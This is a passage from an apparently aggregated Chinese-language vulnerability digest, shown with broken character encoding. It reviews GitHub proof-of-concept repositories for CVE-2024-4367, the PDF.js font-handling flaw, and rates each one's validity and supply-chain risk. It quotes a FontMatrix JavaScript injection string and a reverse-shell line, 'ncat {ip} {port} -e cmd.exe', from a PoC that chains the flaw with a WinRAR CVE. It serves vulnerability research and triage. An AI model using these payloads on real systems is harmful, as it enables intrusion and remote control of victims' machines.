**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„JavaScriptä»£ç ä¼šè¢«æ‰§è¡Œã€‚  

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**  æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶æä¾›äº†æ¼æ´çš„æ¦‚è¿°ã€åˆ©ç”¨æ–¹æ³•ã€ç¼“è§£æªæ–½å’Œè¯¦ç»†åˆ†æçš„é“¾æ¥ã€‚`poc.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„payloadçš„PDFæ–‡ä»¶ã€‚`app` ç›®å½•åŒ…å«ä¸€ä¸ªç®€å•çš„Node.jsåº”ç”¨ï¼Œç”¨äºæœ¬åœ°æµ‹è¯•ï¼Œå…è®¸ä¸Šä¼ PDFæ–‡ä»¶å¹¶é€šè¿‡`pdfjs-dist`åº“è¿›è¡Œæ¸²æŸ“ã€‚  `public/index.html` åŒ…å«å‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ PDFå¹¶ä½¿ç”¨`pdf.js`è¿›è¡Œæ¸²æŸ“ã€‚  

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**  
*   æŸ¥çœ‹ `poc.pdf` ç¡®è®¤æ˜¯å¦æ¤å…¥åé—¨ï¼Œ`poc.pdf` æ˜¯æ¶æ„çš„PDFï¼Œ åˆ©ç”¨äº†å­—ä½“çš„è§£ææ¼æ´ï¼Œæ‰§è¡ŒJavascriptä»£ç ã€‚ ä½†æ˜¯ä¸å±äºåé—¨ï¼Œåªå±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
*   æŸ¥çœ‹ `server.js` ä¸­é—´ä»¶æ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼Œ`server.js` ä¸­é—´ä»¶å±äºæ­£å¸¸çš„expressä¸Šä¼ pdfå’Œæ‰“å¼€pdfçš„é€»è¾‘ã€‚
*   æŸ¥çœ‹ `public/index.html` ç¡®è®¤æ˜¯å¦è°ƒç”¨æ¶æ„apiï¼Œ `public/index.html`å±äºå‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ pdfï¼Œå¹¶æ¸²æŸ“pdfï¼Œæ²¡æœ‰æ¶æ„apiè°ƒç”¨ã€‚
*   æŸ¥çœ‹ `poc.py` ç¡®è®¤æ˜¯å¦ç”Ÿæˆäº†æ¶æ„PDFï¼Œ`poc.py`å±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
æ€»ä½“åˆ¤æ–­æŠ•æ¯’é£é™©æä½ï¼Œå¯èƒ½å­˜åœ¨çš„é£é™©æ˜¯ä¾èµ–åŒ…çš„ä¾›åº”é“¾æŠ•æ¯’é£é™©,è€ƒè™‘åˆ°node_modulesä½“ç§¯å·¨å¤§ï¼Œäººå·¥å®¡è®¡æˆæœ¬å¤ªé«˜ï¼Œæ‰€ä»¥è®¤ä¸ºå­˜åœ¨ 1% çš„æ½œåœ¨æŠ•æ¯’é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨ `poc.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…é€šè¿‡å„ç§æ‰‹æ®µï¼ˆä¾‹å¦‚ï¼Œç”µå­é‚®ä»¶ã€ç½‘ç«™é“¾æ¥ï¼‰è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ–‡ä»¶ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„JavaScriptä»£ç ä¼šåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œä»è€Œå®ç°XSSæ”»å‡»æˆ–æ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç çªƒå–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ã€ä¿®æ”¹ç½‘é¡µå†…å®¹ï¼Œç”šè‡³æ§åˆ¶ç”¨æˆ·çš„è®¡ç®—æœºã€‚

**é¡¹ç›®åœ°å€:** [Masamuneee/CVE-2024-4367-Analysis](https://github.com/Masamuneee/CVE-2024-4367-Analysis)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #7

**æ¥æº**: [CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md](../2024/CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md)

## CVE-2024-4367 - Firefox/Thunderbird PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶ï¼Œå¹¶ä¸”PDF.jsé…ç½®ä¸­`isEvalSupported`è®¾ç½®ä¸º`true` (é»˜è®¤å€¼)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¯¥æ¼æ´æ˜¯ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ POC ä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ªè‡ªå®šä¹‰å­—ä½“ï¼ˆå¯¹è±¡ 5 0 objï¼‰ï¼Œè¯¥å­—ä½“çš„ `FontMatrix` å±æ€§åŒ…å« JavaScript ä»£ç ï¼š`/FontMatrix [0.1 0 0 0.1 0 (1\); alert\('document.location'\)]`ã€‚å½“å‘ˆç°æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå¦‚æœ PDF.js æ²¡æœ‰æ­£ç¡®æ‰§è¡Œç±»å‹æ£€æŸ¥ï¼Œå°±ä¼šæ‰§è¡Œ `alert('document.location')`ã€‚

**æŠ•æ¯’é£é™©ï¼š**

ç»è¿‡åˆ†æï¼Œæä¾›çš„POCä»£ç ä¸­**æ²¡æœ‰**å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`alert('document.location')` ä»…ä»…æ˜¯ä¸€ä¸ªå¼¹çª—ï¼Œç”¨äºéªŒè¯XSSæ˜¯å¦æ‰§è¡Œ. 

æŠ•æ¯’é£é™©è¯„ä¼°ï¼š0%

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **åˆ›å»ºæ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…ä¼šåˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒJavaScript ä»£ç åµŒå…¥åœ¨å­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­ã€‚
2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±å¯¼ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefoxã€Firefox ESR æˆ– Thunderbird æ‰“å¼€è¿™ä¸ªæ¶æ„ PDF æ–‡ä»¶ã€‚è¿™å¯ä»¥é€šè¿‡ç½‘ç»œé’“é±¼æ”»å‡»ã€æ¶æ„ç½‘ç«™æˆ–å°† PDF æ–‡ä»¶åµŒå…¥åˆ°ç”µå­é‚®ä»¶ä¸­æ¥å®ç°ã€‚
3.  **JavaScript ä»£ç æ‰§è¡Œï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šå°è¯•è§£æå’Œå‘ˆç° PDF å†…å®¹ã€‚ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­çš„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚å¦‚æœæˆåŠŸ `alert('document.location')` ä¼šè§¦å‘ã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å¯¼è‡´ä»¥ä¸‹åæœï¼š
    *   **è·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼š** æ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œçªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ Cookieã€ä¼šè¯ä»¤ç‰Œï¼‰ã€ç¯¡æ”¹ç½‘é¡µå†…å®¹æˆ–é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€‚
    *   **ä¿¡æ¯æ³„éœ²ï¼š** æ”»å‡»è€…å¯ä»¥è®¿é—®ç”¨æˆ·çš„æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿæˆ–ç½‘ç»œèµ„æºï¼Œä»è€Œæ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   **å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ï¼š** å°† Firefoxã€Firefox ESR å’Œ Thunderbird å‡çº§åˆ°å·²ä¿®å¤æ­¤æ¼æ´çš„ç‰ˆæœ¬ (>= Firefox 126, >= Firefox ESR 115.11, >= Thunderbird 115.11)ã€‚
*   **è°¨æ…æ‰“å¼€ PDF æ–‡ä»¶ï¼š** é¿å…æ‰“å¼€æ¥è‡ªä¸å¯ä¿¡æ¥æºçš„ PDF æ–‡ä»¶ã€‚
*   **é…ç½® PDF.jsï¼š** å¦‚æœä¸éœ€è¦ JavaScript æ”¯æŒï¼Œå¯ä»¥ç¦ç”¨ PDF.js çš„ JavaScript æ‰§è¡ŒåŠŸèƒ½ (å°† `isEvalSupported` è®¾ç½®ä¸º `false`)ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼ç›¸å¯¹ç®€å•ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ PDF æ–‡ä»¶å¹¶è¯±å¯¼ç”¨æˆ·æ‰“å¼€æ¥æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è™½ç„¶CVSSè¯„åˆ†ä¸é«˜ï¼Œä½†ç”±äºfirefox,thunderbirdç”¨æˆ·çš„å¹¿æ³›æ€§ï¼Œå…¶é€ æˆçš„å±å®³ä¸å¯å¿½è§†

**é¡¹ç›®åœ°å€:** [MihranGIT/POC_CVE-2024-4367](https://github.com/MihranGIT/POC_CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #8

**æ¥æº**: [CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md](../2024/CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md)

## CVE-2024-4367-Firefox-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œä¿¡æ¯æ³„éœ²ã€‚

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefoxã€Firefox ESRå’ŒThunderbirdä¸­PDF.jsç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ã€‚è¯¥æ¼æ´æºäºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œä¸€ä¸ªç‰¹åˆ¶çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚ 

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶ä¸­æä¾›äº†åˆ©ç”¨æ­¥éª¤ï¼š
1.  ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„ `poc.pdf` æ–‡ä»¶ã€‚
2.  ä½¿ç”¨ `firefox.py` è„šæœ¬å¯åŠ¨æ˜“å—æ”»å‡»ç‰ˆæœ¬çš„Firefox (ä¾‹å¦‚ 125ç‰ˆ)ï¼Œå¹¶è‡ªåŠ¨æ‰“å¼€ `poc.pdf`ã€‚
3.  éªŒè¯æ˜¯å¦æ‰§è¡Œäº†JavaScriptä»£ç ï¼Œæ˜¯å¦å¼¹å‡ºäº†alertçª—å£ã€‚

`firefox.py` è„šæœ¬å¯ä»¥ä¸‹è½½å¹¶å¯åŠ¨æŒ‡å®šç‰ˆæœ¬çš„Firefox Nightlyç‰ˆæœ¬ï¼Œè¿™æ–¹ä¾¿äº†æ¼æ´çš„éªŒè¯ã€‚è„šæœ¬è¿˜åŒ…å«äº†ä¸‹è½½ç‰¹å®šç‰ˆæœ¬Firefoxçš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

å¯¹æä¾›çš„POCä»£ç è¿›è¡Œäº†åˆ†æï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚é£é™©ä¸»è¦æ¥è‡ªäºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **`firefox.py`è„šæœ¬:**
    *   è¯¥è„šæœ¬ä¼šä»Mozillaçš„å®˜æ–¹FTPæœåŠ¡å™¨ä¸‹è½½Firefox Nightlyç‰ˆæœ¬ã€‚è™½ç„¶è¿™æ˜¯å®˜æ–¹æ¥æºï¼Œä½†æ”»å‡»è€…å¯èƒ½åœ¨æœªæ¥ç¯¡æ”¹è¿™äº›FTPæœåŠ¡å™¨ï¼ˆè™½ç„¶å¯èƒ½æ€§æä½ï¼‰ã€‚æˆ–è€…ï¼Œåœ¨ä¸‹è½½è¿‡ç¨‹ä¸­å‘ç”Ÿä¸­é—´äººæ”»å‡»ï¼Œä»è€Œä¸‹è½½è¢«ç¯¡æ”¹çš„Firefoxç‰ˆæœ¬ã€‚
    *   è¯¥è„šæœ¬åŒ…å« `subprocess.run` å‡½æ•°ï¼Œç”¨äºæ‰§è¡Œä¸‹è½½çš„Firefoxã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è„šæœ¬æ‰§è¡Œçš„å‚æ•°ï¼Œå¯èƒ½ä¼šæ³¨å…¥é¢å¤–çš„å‚æ•°ï¼Œå¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
    *   å°½ç®¡è„šæœ¬çš„ç›®çš„ä¼¼ä¹æ˜¯ä¸ºäº†æ–¹ä¾¿åœ°ä¸‹è½½å’Œå¯åŠ¨ç‰¹å®šç‰ˆæœ¬çš„Firefoxï¼Œä½†ç”¨æˆ·ä»ç„¶éœ€è¦ä»”ç»†æ£€æŸ¥è„šæœ¬çš„å†…å®¹ï¼Œç¡®ä¿ä¸‹è½½é“¾æ¥å’Œæ‰§è¡Œè¿‡ç¨‹æ˜¯å®‰å…¨çš„ã€‚
2.  **`CVE-2024-4367.py`è„šæœ¬ (æœªæä¾›å…·ä½“ä»£ç ):**
    *   è™½ç„¶`README.md`æŒ‡å‘ä¸€ä¸ªå¤–éƒ¨githubåº“ï¼Œä½†å¦‚æœæ­¤åº“è¢«ç¯¡æ”¹ï¼Œæ‰§è¡Œè„šæœ¬`CVE-2024-4367.py`ç”Ÿæˆçš„`poc.pdf`æ–‡ä»¶æœ‰å¯èƒ½åµŒå…¥æ›´æ¶æ„çš„Payload.
3.  **å…è´£å£°æ˜:**
    *   `README.md` ä¸­åŒ…å«å…è´£å£°æ˜ï¼Œè¿™è¡¨æ˜ä½œè€…æ„è¯†åˆ°æ½œåœ¨çš„é£é™©ï¼Œå¹¶è¯•å›¾æ’‡æ¸…è´£ä»»ã€‚ä½†è¿™å¹¶ä¸èƒ½å®Œå…¨æ¶ˆé™¤é£é™©ï¼Œç”¨æˆ·ä»ç„¶éœ€è¦è‡ªè¡Œæ‰¿æ‹…ä½¿ç”¨POCä»£ç çš„åæœã€‚

æ€»çš„æ¥è¯´ï¼Œè¯¥ä»“åº“çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æ¼”ç¤ºæ¼æ´åˆ©ç”¨ï¼Œè€Œä¸æ˜¯ä¸ºäº†è¿›è¡Œæ¶æ„æ”»å‡»ã€‚ä½†æ˜¯ï¼Œç”¨æˆ·åœ¨ä½¿ç”¨è¿™äº›ä»£ç æ—¶ä»ç„¶éœ€è¦ä¿æŒè­¦æƒ•ï¼Œä»”ç»†å®¡æŸ¥ä»£ç å†…å®¹ï¼Œç¡®ä¿äº†è§£æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´è§¦å‘:** æ”»å‡»è€…éœ€è¦åˆ¶ä½œåŒ…å«ç‰¹å®šæ ¼å¼çš„æ¶æ„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±ã€‚
2.  **JavaScriptæ‰§è¡Œ:** å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šå°è¯•è§£ææ¶æ„å­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´ä»»æ„JavaScriptä»£ç åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  **æ”»å‡»ç›®æ ‡:** æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç æ¥çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ cookiesï¼‰ã€æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€æˆ–è€…è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ã€‚

**æ€»ç»“ï¼š**
è¯¥æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”±äºFirefoxé»˜è®¤ä½¿ç”¨PDF.jsæ‰“å¼€PDFæ–‡ä»¶ï¼Œå› æ­¤è¯¥æ¼æ´å…·æœ‰è¾ƒé«˜çš„å½±å“èŒƒå›´ã€‚æä¾›çš„POCä»£ç å¯ä»¥å¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜éªŒè¯å’Œç†è§£è¯¥æ¼æ´ï¼Œä½†ä¹Ÿéœ€è¦æ³¨æ„æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [PenguinCabinet/CVE-2024-4367-hands-on](https://github.com/PenguinCabinet/CVE-2024-4367-hands-on)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #9

**æ¥æº**: [CVE-2024-4367-Scivous_CVE-2024-4367-npm.md](../2024/CVE-2024-4367-Scivous_CVE-2024-4367-npm.md)

## CVE-2024-4367-PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ¼æ´æºäºPDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨è¯¥æ¼æ´åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ¼æ´å½±å“Firefox, Firefox ESR, Thunderbirdã€‚ æ ¹æ®æœç´¢ç»“æœï¼ŒGitHubä¸Šå­˜åœ¨åˆ©ç”¨æ­¤æ¼æ´çš„POCä»£ç ã€‚ æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md)æ¯”è¾ƒç®€å•ï¼Œä»…ä»…æè¿°äº†CVE-2024-4367çš„å¤ç°ï¼Œä»è¯¥æ–‡ä»¶æ¥çœ‹ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ã€‚ä½†è€ƒè™‘åˆ°å®é™…çš„æ¼æ´åˆ©ç”¨ä»£ç å¯èƒ½åœ¨å…¶ä»–æ–‡ä»¶ä¸­ï¼Œéœ€è¦è¿›ä¸€æ­¥åˆ†ææ‰èƒ½ç¡®å®šæ˜¯å¦å­˜åœ¨æŠ•æ¯’è¡Œä¸ºã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç²¾å¿ƒæ„é€ çš„PDFæ–‡ä»¶è§¦å‘å­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼Œä»è€Œæ‰§è¡Œæ¶æ„JavaScriptä»£ç ã€‚CVSSè¯„åˆ†æ ¹æ®NVDçš„å˜æ›´è®°å½•ï¼Œä»åŸæ¥çš„CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:Lä¿®æ”¹ä¸ºäº†NIST AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H, è¿™è¡¨æ˜åˆ©ç”¨æ¡ä»¶å˜çš„å®¹æ˜“ï¼Œå±å®³æ€§æ›´é«˜äº†ã€‚å¦å¤–ï¼Œæœ‰è®¨è®ºè¡¨æ˜115.19.0esrä»ç„¶å—æ­¤æ¼æ´å½±å“ï¼Œéœ€è¦è¿›ä¸€æ­¥éªŒè¯ã€‚

**é¡¹ç›®åœ°å€:** [Scivous/CVE-2024-4367-npm](https://github.com/Scivous/CVE-2024-4367-npm)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #10

**æ¥æº**: [CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md](../2024/CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md)

## CVE-2024-4367 & CVE-2023-38831 PDFernet Remotelo

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** PDF.js å­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ & WinRARå‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird, WinRAR

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11, WinRAR <= 6.22

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿéœ€å®‰è£…å—å½±å“ç‰ˆæœ¬çš„Firefox/Thunderbirdå’ŒWinRARï¼Œä¸”ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

è¯¥POCåˆ©ç”¨äº†CVE-2024-4367 (PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ) å’Œ CVE-2023-38831 (WinRARå‘½ä»¤æ‰§è¡Œ) ä¸¤ä¸ªæ¼æ´ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼:**
1.  **CVE-2024-4367:**  é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡PDF.jsçš„ç±»å‹æ£€æŸ¥ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
2.  **CVE-2023-38831:**  åˆ©ç”¨WinRARå¤„ç†å‹ç¼©åŒ…æ—¶çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æ¶æ„raræ–‡ä»¶ä¸­åŒ…å«pdfå’Œbatè„šæœ¬,å½“ç”¨æˆ·å°è¯•æ‰“å¼€è¿™ä¸ªPDFæ–‡æ¡£æ—¶ï¼Œä¼šè§¦å‘WinRARæ¼æ´ï¼Œæ‰§è¡Œæ†ç»‘çš„BATè„šæœ¬ã€‚
3.  **POCä»£ç æµç¨‹:**
    *   ä¸»è„šæœ¬`PDFernetRemotelo.py`æç¤ºç”¨æˆ·è¾“å…¥æ”»å‡»è€…IPå’Œç«¯å£ã€‚
    *   åˆ›å»ºè¯±é¥µPDFæ–‡ä»¶ï¼ˆ`ResumendeSueldo.pdf`ï¼‰å’Œä¸€ä¸ªåŒ…å«åå‘shellå‘½ä»¤çš„BATè„šæœ¬ï¼ˆ`script.bat`ï¼‰ï¼Œè„šæœ¬å†…å®¹ä¸º`ncat {ip} {port} -e cmd.exe`ã€‚
